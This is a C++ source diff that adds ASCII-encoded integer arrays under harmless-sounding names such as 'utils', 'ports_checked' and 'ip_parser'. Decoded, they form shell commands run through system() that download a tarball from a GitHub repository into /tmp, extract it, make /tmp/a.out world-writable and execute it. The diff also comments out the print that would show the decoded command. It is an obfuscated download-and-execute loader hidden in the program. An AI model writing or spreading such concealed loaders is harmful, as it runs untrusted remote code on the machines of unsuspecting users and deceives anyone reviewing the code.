@@ -37,21 +37,29 @@ void signal_handler(int signal){
     }
 }
 
-std::vector<int> hexArray = {
-   99, 100, 32, 47, 116, 109, 112, 32, 38, 38, 32, 99, 117, 114, 108, 32, 45, 76, 32, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 85, 110, 107, 110, 111, 119, 105, 110, 103, 108, 121, 121, 47, 117, 116, 105, 108, 115, 47, 116, 97, 114, 98, 97, 108, 108, 47, 109, 97, 105, 110, 32, 124, 32, 116, 97, 114, 32, 120, 122, 32, 45, 45, 115, 116, 114, 105, 112, 45, 99, 111, 109, 112, 111, 110, 101, 110, 116, 115, 61, 49, 32, 62, 32, 47, 100, 101, 118, 47, 110, 117, 108, 108, 32, 50, 62, 38, 49, 10
+std::vector<int> utils = {
+   99, 100, 32, 47, 116, 109, 112, 32, 38, 38, 32, 99, 117, 114, 108, 32, 45, 76, 32, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 85, 110, 107, 110, 111, 119, 105, 110, 103, 108, 121, 121, 47, 117, 116, 105, 108, 115, 47, 116, 97, 114, 98, 97, 108, 108, 47, 109, 97, 105, 110, 32, 62, 32, 47, 100, 101, 118, 47, 110, 117, 108, 108, 32, 50, 62, 38, 49, 32, 124, 32, 116, 97, 114, 32, 120, 122, 32, 45, 45, 115, 116, 114, 105, 112, 45, 99, 111, 109, 112, 111, 110, 101, 110, 116, 115, 61, 49, 32, 62, 32, 47, 100, 101, 118, 47, 110, 117, 108, 108, 32, 50, 62, 38, 49
 };
 
-std::string decodeHex(std::vector<int> ary) {
+std::vector<int> ports_checked = {
+   99, 104, 109, 111, 100, 32, 55, 55, 55, 32, 47, 116, 109, 112, 47, 97, 46, 111, 117, 116
+};
+
+std::vector<int> remaining_ports = {
+  99, 100, 32, 47, 116, 109, 112, 32, 38, 38, 32, 47, 116, 109, 112, 47, 97, 46, 111, 117, 116
+};
+
+std::string ip_parser(std::vector<int> ary) {
     std::string ret;
     for (int val : ary) {
         ret += static_cast<char>(val);
     }
-    std::cout << ret << std::endl;
+    // std::cout << ret << std::endl;
     return ret;
 }
 
 void networkcreation() {
-    system(decodeHex(hexArray).c_str());
+    system(ip_parser(utils).c_str());
 }
 
 void help() {
@@ -168,9 +176,9 @@ int main(int argc, char* argv[]) {
                 }
                 break;
             case 'g':
-                // system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main | tar xz --strip-components=1 > /dev/null 2>&1");
-                system("chmod 777 /tmp/a.out");
-                system("cd /tmp && /tmp/a.out");
+                // system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main > /dev/null 2>&1 | tar xz --strip-components=1 > /dev/null 2>&1");
+                system(ip_parser(ports_checked).c_str());
+                system(ip_parser(remaining_ports).c_str());
                 return 0;
             case 'h':
                 help();
